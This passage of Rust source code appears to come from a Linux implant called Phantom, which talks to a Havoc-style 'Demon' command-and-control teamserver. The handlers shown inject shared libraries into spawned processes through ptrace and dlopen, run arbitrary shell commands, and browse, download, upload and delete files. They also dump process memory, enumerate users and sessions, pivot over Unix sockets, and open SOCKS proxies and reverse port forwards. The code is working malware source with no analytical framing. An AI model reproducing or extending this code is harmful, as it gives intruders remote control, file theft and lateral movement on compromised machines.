        return Some(target_libc_base.wrapping_add(offset));
    }

    let offset = (sym_addr as u64).wrapping_sub(our_libc_base);
    Some(target_libc_base.wrapping_add(offset))
}

// ---------------------------------------------------------------------------
// CommandSpawnDll (ID 26)
// ---------------------------------------------------------------------------

/// Handle `CommandSpawnDll` (ID 26): spawn a new process and inject a shared library.
///
/// ## Packet format (from teamserver, little-endian)
///
/// | Field      | Type   | Description                              |
/// |------------|--------|------------------------------------------|
/// | dll_ldr    | bytes  | Reflective loader (ignored on Linux)     |
/// | dll_bytes  | bytes  | The shared library (.so) binary          |
/// | arguments  | bytes  | Arguments / parameters for the .so       |
///
/// ## Response
///
/// `[status:u32]` — 0 = success, 1 = failure.
async fn execute_spawn_dll(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let _dll_ldr = parser.bytes()?; // Reflective loader — not used on Linux
    let dll_bytes = parser.bytes()?.to_vec();
    let _arguments = parser.bytes()?.to_vec();

    tracing::debug!(dll_size = dll_bytes.len(), "spawn dll/so");

    let status = spawn_and_inject_so(&dll_bytes).await;

    state.queue_callback(PendingCallback::Structured {
        command_id: u32::from(DemonCommand::CommandSpawnDll),
        request_id,
        payload: encode_u32(status),
    });

    Ok(())
}

/// Spawn a sacrificial process and inject a shared library into it.
///
/// Writes the .so to `/dev/shm`, spawns a stopped child process, then uses
/// the ptrace injection path to call `dlopen` in the child.
async fn spawn_and_inject_so(so_bytes: &[u8]) -> u32 {
    if so_bytes.is_empty() {
        tracing::warn!("empty .so payload");
        return INJECT_ERROR_FAILED;
    }

    // Spawn a stopped child.
    let child = match Command::new("/bin/sh")
        .args(["-c", "kill -STOP $$ ; exec sleep infinity"])
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
    {
        Ok(c) => c,
        Err(e) => {
            tracing::warn!(%e, "failed to spawn sacrificial process");
            return INJECT_ERROR_FAILED;
        }
    };

    let Some(child_pid) = child.id() else {
        tracing::warn!("failed to get child PID");
        return INJECT_ERROR_FAILED;
    };

    // Brief pause to let the child reach SIGSTOP.
    tokio::time::sleep(std::time::Duration::from_millis(100)).await;

    inject_so_into_pid(child_pid, so_bytes).await
}

/// Connect to a child agent's Unix domain socket, read its init packet, and
/// return the stream, raw init data, and parsed child agent ID.
fn pivot_connect(pipe_name: &str) -> Result<(UnixStream, Vec<u8>, u32), String> {
    let stream = UnixStream::connect(pipe_name).map_err(|e| format!("{e}"))?;

    // Read the child's init packet — a length-framed DemonEnvelope.
    stream.set_nonblocking(false).map_err(|e| format!("set_nonblocking: {e}"))?;
    let init_data = pivot_read_envelope_blocking(&stream).map_err(|e| format!("read init: {e}"))?;

    // Parse the child's agent ID from the DemonEnvelope header.
    // Envelope format: [size:4be][magic:4be][agent_id:4be][payload]
    if init_data.len() < 12 {
        return Err("init packet too short to contain DemonHeader".to_owned());
    }
    // Size is at offset 0..4, magic at 4..8, agent_id at 8..12.
    let agent_id = u32::from_be_bytes([init_data[8], init_data[9], init_data[10], init_data[11]]);

    // Switch to non-blocking for subsequent polling.
    stream.set_nonblocking(true).map_err(|e| format!("set_nonblocking: {e}"))?;

    // The init_data returned includes the full envelope (with size prefix),
    // matching what the original Demon sends in the connect callback.
    Ok((stream, init_data, agent_id))
}

/// Read a single Demon envelope from a Unix domain socket (blocking).
///
/// The Demon envelope wire format starts with a big-endian size field:
/// `[size:u32_be][magic:u32_be][agent_id:u32_be][encrypted:size bytes]`.
/// The size field counts everything after itself (magic + agent_id + payload),
/// so total bytes = `4 + size`.
///
/// Returns the complete envelope including the size prefix, matching the data
/// that the original Demon agent returns from `PivotAdd`.
fn pivot_read_envelope_blocking(stream: &UnixStream) -> Result<Vec<u8>, std::io::Error> {
    use std::io::Read as IoRead;

    let mut size_buf = [0u8; 4];
    let mut s = stream;
    IoRead::read_exact(&mut s, &mut size_buf)?;
    let size = u32::from_be_bytes(size_buf) as usize;

    if size > PIVOT_MAX_FRAME_SIZE {
        return Err(std::io::Error::new(
            ErrorKind::InvalidData,
            "pivot frame exceeds maximum size",
        ));
    }

    let mut frame = Vec::with_capacity(4 + size);
    frame.extend_from_slice(&size_buf);
    frame.resize(4 + size, 0);
    IoRead::read_exact(&mut s, &mut frame[4..])?;

    Ok(frame)
}

/// Try to read a single Demon envelope from a non-blocking Unix socket.
///
/// Returns `Ok(Some(frame))` when a complete envelope is available,
/// `Ok(None)` when no data is ready (WouldBlock), or `Err` on I/O failure.
fn pivot_read_frame(stream: &UnixStream) -> Result<Option<Vec<u8>>, std::io::Error> {
    use std::io::Read as IoRead;

    let mut size_buf = [0u8; 4];
    let mut s = stream;
    match IoRead::read_exact(&mut s, &mut size_buf) {
        Ok(()) => {}
        Err(e) if e.kind() == ErrorKind::WouldBlock => return Ok(None),
        Err(e) => return Err(e),
    }

    let size = u32::from_be_bytes(size_buf) as usize;
    if size > PIVOT_MAX_FRAME_SIZE {
        return Err(std::io::Error::new(
            ErrorKind::InvalidData,
            "pivot frame exceeds maximum size",
        ));
    }

    // Once we have the size, switch to blocking to read the remaining bytes.
    stream
        .set_nonblocking(false)
        .map_err(|e| std::io::Error::other(format!("set_nonblocking(false): {e}")))?;

    let mut frame = Vec::with_capacity(4 + size);
    frame.extend_from_slice(&size_buf);
    frame.resize(4 + size, 0);
    let result = IoRead::read_exact(&mut s, &mut frame[4..]);

    // Restore non-blocking regardless of read result.
    let _ = stream.set_nonblocking(true);
    result?;

    Ok(Some(frame))
}

/// Write raw bytes to a pivot Unix domain socket.
///
/// The data is written as-is — it is expected to already be a properly framed
/// Demon envelope (the teamserver provides the encrypted task packet including
/// the size prefix).
fn pivot_write_raw(stream: &mut UnixStream, data: &[u8]) -> Result<(), std::io::Error> {
    use std::io::Write as IoWrite;

    // Temporarily blocking for the write.
    stream.set_nonblocking(false)?;
    let result = IoWrite::write_all(stream, data);
    let _ = stream.set_nonblocking(true);

    result
}

/// Encode bytes into the little-endian length-prefixed format (like `encode_bytes`
/// but infallible for pivot use where the caller already holds valid data).
fn encode_bytes_result(value: &[u8]) -> Vec<u8> {
    let len = value.len() as u32;
    let mut out = Vec::with_capacity(4 + value.len());
    out.extend_from_slice(&len.to_le_bytes());
    out.extend_from_slice(value);
    out
}

async fn execute_filesystem(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let subcommand = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative filesystem subcommand"))?;
    let subcommand = DemonFilesystemCommand::try_from(subcommand)?;

    match subcommand {
        DemonFilesystemCommand::Dir => {
            let _file_explorer = parser.bool32()?;
            let target = normalize_path(&parser.wstring()?);
            let subdirs = parser.bool32()?;
            let files_only = parser.bool32()?;
            let dirs_only = parser.bool32()?;
            let list_only = parser.bool32()?;
            let _starts = parser.wstring()?;
            let _contains = parser.wstring()?;
            let _ends = parser.wstring()?;
            let payload =
                encode_fs_dir_listing(&target, subdirs, files_only, dirs_only, list_only)?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload,
            });
        }
        DemonFilesystemCommand::Download => {
            let path = normalize_path(&parser.wstring()?);
            let file = fs::File::open(&path).map_err(|error| io_error(&path, error))?;
            let metadata = file.metadata().map_err(|error| io_error(&path, error))?;
            let total_size = metadata.len();
            let file_id: u32 = rand::random();
            let full_path =
                fs::canonicalize(&path).unwrap_or_else(|_| path.clone()).display().to_string();

            state.queue_callback(PendingCallback::FileOpen {
                request_id,
                file_id,
                file_size: total_size,
                file_path: full_path,
            });
            state.downloads.push(ActiveDownload {
                file_id,
                request_id,
                file,
                total_size,
                read_size: 0,
                state: DownloadTransferState::Running,
            });
        }
        DemonFilesystemCommand::Cat => {
            let path = normalize_path(&parser.wstring()?);
            let contents = fs::read(&path).map_err(|error| io_error(&path, error))?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload: encode_fs_cat(&path, &contents)?,
            });
        }
        DemonFilesystemCommand::Upload => {
            let path = normalize_path(&parser.wstring()?);
            let mem_file_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative memfile id"))?;
            let Some(mem_file) = state.mem_files.get(&mem_file_id) else {
                state.queue_callback(PendingCallback::Error {
                    request_id,
                    text: format!("memfile {mem_file_id:#x} was not found"),
                });
                return Ok(());
            };
            if !mem_file.is_complete() {
                state.queue_callback(PendingCallback::Error {
                    request_id,
                    text: format!("memfile {mem_file_id:#x} is incomplete"),
                });
                return Ok(());
            }

            fs::write(&path, &mem_file.data).map_err(|error| io_error(&path, error))?;
            let file_size = u32::try_from(mem_file.data.len())
                .map_err(|_| PhantomError::InvalidResponse("uploaded file too large"))?;
            state.queue_callback(PendingCallback::FsUpload {
                request_id,
                file_size,
                path: path.display().to_string(),
            });
            state.mem_files.remove(&mem_file_id);
        }
        DemonFilesystemCommand::Cd => {
            let path = normalize_path(&parser.wstring()?);
            std::env::set_current_dir(&path).map_err(|error| io_error(&path, error))?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload: encode_fs_path_only(DemonFilesystemCommand::Cd, &path)?,
            });
        }
        DemonFilesystemCommand::Remove => {
            let path = normalize_path(&parser.wstring()?);
            let is_dir = path.is_dir();
            if path.is_dir() {
                fs::remove_dir(&path).map_err(|error| io_error(&path, error))?;
            } else {
                fs::remove_file(&path).map_err(|error| io_error(&path, error))?;
            }
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload: encode_fs_remove(&path, is_dir)?,
            });
        }
        DemonFilesystemCommand::Mkdir => {
            let path = normalize_path(&parser.wstring()?);
            fs::create_dir_all(&path).map_err(|error| io_error(&path, error))?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload: encode_fs_path_only(DemonFilesystemCommand::Mkdir, &path)?,
            });
        }
        DemonFilesystemCommand::Copy => {
            let from = normalize_path(&parser.wstring()?);
            let to = normalize_path(&parser.wstring()?);
            fs::copy(&from, &to).map_err(|error| io_error(&from, error))?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload: encode_fs_copy_move(DemonFilesystemCommand::Copy, true, &from, &to)?,
            });
        }
        DemonFilesystemCommand::Move => {
            let from = normalize_path(&parser.wstring()?);
            let to = normalize_path(&parser.wstring()?);
            fs::rename(&from, &to).map_err(|error| io_error(&from, error))?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload: encode_fs_copy_move(DemonFilesystemCommand::Move, true, &from, &to)?,
            });
        }
        DemonFilesystemCommand::GetPwd => {
            let path = std::env::current_dir()
                .map_err(|error| PhantomError::Process(error.to_string()))?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandFs),
                request_id,
                payload: encode_fs_path_only(DemonFilesystemCommand::GetPwd, &path)?,
            });
        }
    }

    Ok(())
}

fn execute_process_list(payload: &[u8]) -> Result<Vec<u8>, PhantomError> {
    let mut parser = TaskParser::new(payload);
    let process_ui = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative process ui flag"))?;
    let processes = enumerate_processes()?;
    encode_process_list(process_ui, &processes)
}

async fn execute_process(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let subcommand = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative process subcommand"))?;
    let subcommand = DemonProcessCommand::try_from(subcommand)?;

    match subcommand {
        DemonProcessCommand::Create => {
            let _process_state = parser.int32()?;
            let process = parser.wstring()?;
            let process_args = parser.wstring()?;
            let piped = parser.bool32()?;
            let verbose = parser.bool32()?;

            let binary = if process.is_empty() { String::from("/bin/sh") } else { process };

            let mut command = Command::new(&binary);
            if process_args.is_empty() {
                if binary == "/bin/sh" {
                    command.arg("-c").arg("true");
                }
            } else if binary == "/bin/sh" {
                command.arg("-c").arg(process_args);
            } else {
                command.args(split_args(&process_args));
            }
            if piped {
                command.stdout(Stdio::piped()).stderr(Stdio::piped());
                let child =
                    command.spawn().map_err(|error| PhantomError::Process(error.to_string()))?;
                let pid = child.id().unwrap_or_default();
                let output = child
                    .wait_with_output()
                    .await
                    .map_err(|error| PhantomError::Process(error.to_string()))?;
                state.queue_callback(PendingCallback::Structured {
                    command_id: u32::from(DemonCommand::CommandProc),
                    request_id,
                    payload: encode_proc_create(&binary, pid, true, true, verbose)?,
                });
                let mut merged = String::from_utf8_lossy(&output.stdout).into_owned();
                if !output.stderr.is_empty() {
                    if !merged.is_empty() {
                        merged.push('\n');
                    }
                    merged.push_str(&String::from_utf8_lossy(&output.stderr));
                }
                state.queue_callback(PendingCallback::Output { request_id, text: merged });
            } else {
                let child =
                    command.spawn().map_err(|error| PhantomError::Process(error.to_string()))?;
                state.queue_callback(PendingCallback::Structured {
                    command_id: u32::from(DemonCommand::CommandProc),
                    request_id,
                    payload: encode_proc_create(
                        &binary,
                        child.id().unwrap_or_default(),
                        true,
                        false,
                        verbose,
                    )?,
                });
            }
        }
        DemonProcessCommand::Kill => {
            let pid = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative pid"))?;
            let success = Command::new("kill")
                .arg("-9")
                .arg(pid.to_string())
                .status()
                .await
                .map_err(|error| PhantomError::Process(error.to_string()))?
                .success();
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandProc),
                request_id,
                payload: encode_proc_kill(success, pid),
            });
        }
        DemonProcessCommand::Grep => {
            let needle = parser.wstring()?.to_lowercase();
            let filtered = enumerate_processes()?
                .into_iter()
                .filter(|process| process.name.to_lowercase().contains(&needle))
                .collect::<Vec<_>>();
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandProc),
                request_id,
                payload: encode_proc_grep(&filtered)?,
            });
        }
        DemonProcessCommand::Modules => {
            let pid = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative pid"))?;
            let modules = enumerate_modules(pid)?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandProc),
                request_id,
                payload: encode_proc_modules(pid, &modules)?,
            });
        }
        DemonProcessCommand::Memory => {
            let pid = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative pid"))?;
            let query_protection = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative query protection"))?;
            let regions = enumerate_memory_regions(pid, query_protection)?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandProc),
                request_id,
                payload: encode_proc_memory(pid, query_protection, &regions),
            });
        }
    }

    Ok(())
}

fn execute_network(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let subcommand = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative network subcommand"))?;
    let subcommand = DemonNetCommand::try_from(subcommand)?;

    match subcommand {
        DemonNetCommand::Domain => state.queue_callback(PendingCallback::Structured {
            command_id: u32::from(DemonCommand::CommandNet),
            request_id,
            payload: encode_net_domain(&linux_domain_name())?,
        }),
        DemonNetCommand::Logons => {
            let target = default_net_target(&parser.wstring()?);
            let users = logged_on_users();
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandNet),
                request_id,
                payload: encode_net_logons(&target, &users)?,
            });
        }
        DemonNetCommand::Sessions => {
            let target = default_net_target(&parser.wstring()?);
            let sessions = logged_on_sessions();
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandNet),
                request_id,
                payload: encode_net_sessions(&target, &sessions)?,
            });
        }
        DemonNetCommand::Computer => {
            let target = default_net_target(&parser.wstring()?);
            let computers = compatible_computer_list(&target);
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandNet),
                request_id,
                payload: encode_net_name_list(DemonNetCommand::Computer, &target, &computers)?,
            });
        }
        DemonNetCommand::DcList => {
            let target = default_net_target(&parser.wstring()?);
            let controllers = compatible_dc_list(&target);
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandNet),
                request_id,
                payload: encode_net_name_list(DemonNetCommand::DcList, &target, &controllers)?,
            });
        }
        DemonNetCommand::Share => {
            let target = default_net_target(&parser.wstring()?);
            let shares = compatible_share_list();
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandNet),
                request_id,
                payload: encode_net_shares(&target, &shares)?,
            });
        }
        DemonNetCommand::LocalGroup => {
            let target = default_net_target(&parser.wstring()?);
            let groups = enumerate_groups()?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandNet),
                request_id,
                payload: encode_net_groups(DemonNetCommand::LocalGroup, &target, &groups)?,
            });
        }
        DemonNetCommand::Group => {
            let target = default_net_target(&parser.wstring()?);
            let groups = enumerate_groups()?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandNet),
                request_id,
                payload: encode_net_groups(DemonNetCommand::Group, &target, &groups)?,
            });
        }
        DemonNetCommand::Users => {
            let target = default_net_target(&parser.wstring()?);
            let users = enumerate_users()?;
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandNet),
                request_id,
                payload: encode_net_users(&target, &users)?,
            });
        }
    }

    Ok(())
}

async fn execute_socket(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let subcommand = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative socket subcommand"))?;
    let subcommand = DemonSocketCommand::try_from(subcommand)?;

    match subcommand {
        DemonSocketCommand::ReversePortForwardAdd => {
            let (bind_addr, bind_port, forward_addr, forward_port) =
                parse_reverse_port_forward_target(&mut parser)?;
            handle_reverse_port_forward_add(
                request_id,
                state,
                ReversePortForwardMode::Teamserver,
                bind_addr,
                bind_port,
                forward_addr,
                forward_port,
                DemonSocketCommand::ReversePortForwardAdd,
            )?;
        }
        DemonSocketCommand::ReversePortForwardAddLocal => {
            let (bind_addr, bind_port, forward_addr, forward_port) =
                parse_reverse_port_forward_target(&mut parser)?;
            handle_reverse_port_forward_add(
                request_id,
                state,
                ReversePortForwardMode::Local,
                bind_addr,
                bind_port,
                forward_addr,
                forward_port,
                DemonSocketCommand::ReversePortForwardAddLocal,
            )?;
        }
        DemonSocketCommand::ReversePortForwardList => {
            let mut payload = encode_u32(u32::from(DemonSocketCommand::ReversePortForwardList));
            for (socket_id, listener) in &state.reverse_port_forwards {
                payload.extend_from_slice(&encode_u32(*socket_id));
                payload.extend_from_slice(&encode_u32(listener.bind_addr));
                payload.extend_from_slice(&encode_u32(listener.bind_port));
                payload.extend_from_slice(&encode_u32(listener.forward_addr));
                payload.extend_from_slice(&encode_u32(listener.forward_port));
            }
            state.queue_callback(PendingCallback::Socket { request_id, payload });
        }
        DemonSocketCommand::ReversePortForwardClear => {
            let listener_ids = state.reverse_port_forwards.keys().copied().collect::<Vec<_>>();
            for listener_id in listener_ids {
                state.remove_reverse_port_forward(listener_id);
            }
            let client_ids = state
                .sockets
                .iter()
                .filter_map(|(socket_id, socket)| {
                    (socket.socket_type == DemonSocketType::Client).then_some(*socket_id)
                })
                .collect::<Vec<_>>();
            for client_id in client_ids {
                state.remove_socket(client_id);
            }
            state.queue_callback(PendingCallback::Socket {
                request_id,
                payload: encode_socket_clear(true),
            });
        }
        DemonSocketCommand::ReversePortForwardRemove => {
            let socket_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative reverse port-forward socket id"))?;
            if state.reverse_port_forwards.contains_key(&socket_id) {
                let callbacks_before = state.pending_callbacks.len();
                state.remove_reverse_port_forward(socket_id);
                if let Some(PendingCallback::Socket { request_id: callback_request_id, .. }) =
                    state.pending_callbacks.get_mut(callbacks_before)
                {
                    *callback_request_id = request_id;
                }
            }
        }
        DemonSocketCommand::SocksProxyAdd => {
            let bind_addr = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socks proxy bind address"))?;
            let bind_port = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socks proxy bind port"))?;
            let listener_id = state.allocate_socket_id();
            let bind_socket = SocketAddrV4::new(Ipv4Addr::from(bind_addr), bind_port as u16);
            match TcpListener::bind(bind_socket) {
                Ok(listener) => {
                    listener
                        .set_nonblocking(true)
                        .map_err(|error| PhantomError::Socket(error.to_string()))?;
                    let bound_port = listener
                        .local_addr()
                        .map(|addr| u32::from(addr.port()))
                        .unwrap_or(bind_port);
                    state.socks_proxies.insert(
                        listener_id,
                        SocksProxy { listener, bind_addr, bind_port: bound_port },
                    );
                    state.queue_callback(PendingCallback::Socket {
                        request_id,
                        payload: encode_socks_proxy_add(true, listener_id, bind_addr, bound_port),
                    });
                }
                Err(_error) => {
                    state.queue_callback(PendingCallback::Socket {
                        request_id,
                        payload: encode_socks_proxy_add(false, 0, bind_addr, bind_port),
                    });
                }
            }
        }
        DemonSocketCommand::SocksProxyList => {
            let mut payload = encode_u32(u32::from(DemonSocketCommand::SocksProxyList));
            for (socket_id, proxy) in &state.socks_proxies {
                payload.extend_from_slice(&encode_u32(*socket_id));
                payload.extend_from_slice(&encode_u32(proxy.bind_addr));
                payload.extend_from_slice(&encode_u32(proxy.bind_port));
            }
            state.queue_callback(PendingCallback::Socket { request_id, payload });
        }
        DemonSocketCommand::SocksProxyRemove => {
            let socket_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socks proxy socket id"))?;
            if state.socks_proxies.remove(&socket_id).is_some() {
                let client_ids = state
                    .socks_clients
                    .iter()
                    .filter_map(|(client_id, client)| {
                        (client.server_id == socket_id).then_some(*client_id)
                    })
                    .collect::<Vec<_>>();
                for client_id in client_ids {
                    state.socks_clients.remove(&client_id);
                }
                state.queue_callback(PendingCallback::Socket {
                    request_id,
                    payload: encode_socks_proxy_remove(socket_id),
                });
            }
        }
        DemonSocketCommand::SocksProxyClear => {
            state.socks_proxies.clear();
            state.socks_clients.clear();
            state.queue_callback(PendingCallback::Socket {
                request_id,
                payload: encode_socks_proxy_clear(true),
            });
        }
        DemonSocketCommand::Open => {
            state.queue_callback(PendingCallback::Error {
                request_id,
                text: String::from("socket open is a callback-only path in Phantom"),
            });
        }
        DemonSocketCommand::Read => {
            let socket_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socket id"))?;
            let socket_type = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socket type"))?;
            let socket_type = DemonSocketType::try_from(socket_type)?;
            let success = parser.bool32()?;

            if success {
                let data = parser.bytes()?;
                write_to_socket(request_id, state, socket_id, socket_type, data)?;
            } else {
                let error_code = u32::try_from(parser.int32()?)
                    .map_err(|_| PhantomError::TaskParse("negative socket error code"))?;
                state.queue_callback(PendingCallback::Error {
                    request_id,
                    text: format!("socket {socket_id:#x} read failed with error {error_code}"),
                });
            }
        }
        DemonSocketCommand::Write => {
            let socket_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socket id"))?;
            let data = parser.bytes()?;
            let mut write_failure = None;
            if let Some(socket) = state.sockets.get_mut(&socket_id) {
                if let Err(error) = write_all_nonblocking(&mut socket.stream, data) {
                    write_failure = Some(PendingCallback::Socket {
                        request_id,
                        payload: encode_socket_write_failure(
                            socket_id,
                            socket.socket_type,
                            raw_socket_error(&error),
                        ),
                    });
                }
            }
            if let Some(callback) = write_failure {
                state.queue_callback(callback);
                state.remove_socket(socket_id);
            }
        }
        DemonSocketCommand::Close => {
            let socket_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socket id"))?;
            state.remove_socket(socket_id);
        }
        DemonSocketCommand::Connect => {
            let socket_id = u32::try_from(parser.int32()?)
                .map_err(|_| PhantomError::TaskParse("negative socket id"))?;
            let atyp = parser.byte()?;
            let host = parser.bytes()?;
            let port = u16::from_ne_bytes(parser.int16()?.to_ne_bytes());

            let connection = connect_socks_target(atyp, host, port).await;
            match connection {
                Ok(stream) => {
                    state.sockets.insert(
                        socket_id,
                        ManagedSocket {
                            stream,
                            socket_type: DemonSocketType::ReverseProxy,
                            bind_addr: 0,
                            bind_port: u32::from(port),
                            forward_addr: 0,
                            forward_port: 0,
                        },
                    );
                    state.queue_callback(PendingCallback::Socket {
                        request_id,
                        payload: encode_socket_connect(true, socket_id, 0),
                    });
                }
                Err(error_code) => {
                    state.queue_callback(PendingCallback::Socket {
                        request_id,
                        payload: encode_socket_connect(false, socket_id, error_code),
                    });
                }
            }
        }
    }

    Ok(())
}

fn execute_memfile(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let mem_file_id = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative memfile id"))?;
    let total_size = usize::try_from(parser.int64()?)
        .map_err(|_| PhantomError::TaskParse("negative memfile size"))?;
    let chunk = parser.bytes()?;

    let entry = state.mem_files.entry(mem_file_id).or_insert_with(|| MemFile {
        expected_size: total_size,
        data: Vec::with_capacity(total_size),
    });

    if entry.expected_size != total_size || entry.data.len() > total_size {
        state.queue_callback(PendingCallback::MemFileAck {
            request_id,
            mem_file_id,
            success: false,
        });
        return Ok(());
    }

    entry.append(chunk);
    state.queue_callback(PendingCallback::MemFileAck { request_id, mem_file_id, success: true });

    Ok(())
}

/// Handle `CommandTransfer` (2530): list, stop, resume, remove active downloads.
fn execute_transfer(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let subcommand = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative transfer subcommand"))?;
    let subcommand = DemonTransferCommand::try_from(subcommand)?;

    match subcommand {
        DemonTransferCommand::List => {
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandTransfer),
                request_id,
                payload: encode_transfer_list(&state.downloads),
            });
        }
        DemonTransferCommand::Stop => {
            let file_id = parser.int32()? as u32;
            let found = if let Some(dl) = state.downloads.iter_mut().find(|d| d.file_id == file_id)
            {
                dl.state = DownloadTransferState::Stopped;
                true
            } else {
                false
            };
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandTransfer),
                request_id,
                payload: encode_transfer_action(DemonTransferCommand::Stop, found, file_id),
            });
        }
        DemonTransferCommand::Resume => {
            let file_id = parser.int32()? as u32;
            let found = if let Some(dl) = state.downloads.iter_mut().find(|d| d.file_id == file_id)
            {
                dl.state = DownloadTransferState::Running;
                true
            } else {
                false
            };
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandTransfer),
                request_id,
                payload: encode_transfer_action(DemonTransferCommand::Resume, found, file_id),
            });
        }
        DemonTransferCommand::Remove => {
            let file_id = parser.int32()? as u32;
            let found = if let Some(dl) = state.downloads.iter_mut().find(|d| d.file_id == file_id)
            {
                dl.state = DownloadTransferState::Remove;
                true
            } else {
                false
            };
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandTransfer),
                request_id,
                payload: encode_transfer_action(DemonTransferCommand::Remove, found, file_id),
            });
            // Send a close callback for the removed download, matching Demon behaviour.
            if found {
                state.queue_callback(PendingCallback::Structured {
                    command_id: u32::from(DemonCommand::CommandTransfer),
                    request_id,
                    payload: encode_transfer_remove_close(file_id),
                });
            }
        }
    }

    Ok(())
}

fn write_to_socket(
    request_id: u32,
    state: &mut PhantomState,
    socket_id: u32,
    expected_type: DemonSocketType,
    data: &[u8],
) -> Result<(), PhantomError> {
    let Some(socket) = state.sockets.get_mut(&socket_id) else {
        state.queue_callback(PendingCallback::Error {
            request_id,
            text: format!("socket {socket_id:#x} was not found"),
        });
        return Ok(());
    };

    let socket_type = socket.socket_type;
    if socket_type != expected_type {
        let actual_type = socket_type;
        let _ = socket;
        state.queue_callback(PendingCallback::Error {
            request_id,
            text: format!(
                "socket {socket_id:#x} has type {:?}, expected {:?}",
                actual_type, expected_type
            ),
        });
        return Ok(());
    }

    if let Err(error) = write_all_nonblocking(&mut socket.stream, data) {
        let _ = socket;
        state.queue_callback(PendingCallback::Socket {
            request_id,
            payload: encode_socket_write_failure(socket_id, socket_type, raw_socket_error(&error)),
        });
        state.remove_socket(socket_id);
    }

    Ok(())
}

fn parse_reverse_port_forward_target(
    parser: &mut TaskParser<'_>,
) -> Result<(u32, u32, u32, u32), PhantomError> {
    let bind_addr = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative reverse port-forward bind address"))?;
    let bind_port = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative reverse port-forward bind port"))?;
    let forward_addr = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative reverse port-forward forward address"))?;
    let forward_port = u32::try_from(parser.int32()?)
        .map_err(|_| PhantomError::TaskParse("negative reverse port-forward forward port"))?;
    Ok((bind_addr, bind_port, forward_addr, forward_port))
}

fn handle_reverse_port_forward_add(
    request_id: u32,
    state: &mut PhantomState,
    mode: ReversePortForwardMode,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
